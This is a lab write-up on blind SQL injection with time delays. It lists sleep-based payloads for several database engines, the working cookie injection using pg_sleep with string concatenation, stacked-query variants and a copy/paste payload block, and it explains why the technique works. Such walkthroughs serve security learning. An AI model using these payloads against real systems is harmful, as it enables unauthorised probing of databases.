# Blind SQL injection with time delays

*A clean, step‑by‑step write‑up using my original flow and raw payloads (no URL‑encoding), with tiny typo fixes and minimal notes.*

---

## 🎯 Goal
**Cause the website to load for 10 seconds.**

---

## ✅ My Exact Steps (verbatim, lightly corrected)

1. **GOAL:** Cause the website to load for 10 seconds.
2. We already know we’ll use some kind of **SLEEP** function depending on the DB, so let’s find the DB version.
3. First we’ll find the **vulnerable parameter**.
4. Going over all the parameters I could find, I realized this might be a **blind SQLi**, which means we’ll have to blindly input injections like monkeys.
5. Function guesses: in **Oracle**: `DBMS_SESSION.SLEEP` (also common: `DBMS_LOCK.SLEEP`), in **PostgreSQL**: `pg_sleep`, in **SQL Server**: `WAITFOR DELAY`, in **MySQL**: `SLEEP`. We can make really extensive queries.
6. **Payloads I used:**  
   `'+AND+DBMS_SESSION.SLEEP(1)--`,  
   `'+AND+pg_sleep(1)--`,  
   `'+AND+sleep(1)--`,  
   `'+AND+WAITFOR DELAY+'0:0:1'--`,  
   `'+AND+111111111111.....--`
7. None of them worked. I thought maybe **AND** isn’t getting recognized at all (ignored by the sink)?
8. Then I tried **string concatenation** on all payloads:  
   `'+||+DBMS_SESSION.SLEEP(1)--` (and friends).
9. `'+||+pg_sleep(1)--` **worked in the cookie** →  
   `TrackingId=lRSj0fa9nvhrCat0'+||+pg_sleep(1)--`
10. Let’s increase to **10 seconds**:  
    `'+||+pg_sleep(10)--`
11. **Lab solved!** ✅

---

## 🧠 Why This Works (minimal notes)
- The vulnerable sink concatenates your cookie into a **string expression**. Adding `AND` didn’t affect the surrounding SQL (likely still inside a quoted string), so the boolean clause was ignored.  
- Using the string **concatenation operator** `||` with a function call forces the database to **evaluate the function** (side effect = **delay**), even if the final value isn’t used.  
- DB sleep primitives recap:  
  - **PostgreSQL**: `pg_sleep(seconds)`  
  - **Oracle**: `DBMS_LOCK.SLEEP(seconds)` (and sometimes `DBMS_SESSION.SLEEP(seconds)`)  
  - **SQL Server**: `WAITFOR DELAY '00:00:10'`  
  - **MySQL**: `SLEEP(10)`

> If concatenation fails on some engines, try `...'||(SELECT pg_sleep(10))||'` or `...'; SELECT pg_sleep(10);--` depending on how the input is embedded.

---

## ⌨️ Raw Payloads (copy/paste — exactly as used)
```text
'+AND+DBMS_SESSION.SLEEP(1)--
'+AND+pg_sleep(1)--
'+AND+sleep(1)--
'+AND+WAITFOR DELAY+'0:0:1'--
'+AND+111111111111.....--
'+||+DBMS_SESSION.SLEEP(1)--
'+||+pg_sleep(1)--
TrackingId=lRSj0fa9nvhrCat0'+||+pg_sleep(1)--
'+||+pg_sleep(10)--
```

---

## 🏁 Result
- Time‑based oracle established through cookie concatenation with `pg_sleep`. Delayed the response by **10 seconds**. **Solved. ✅**
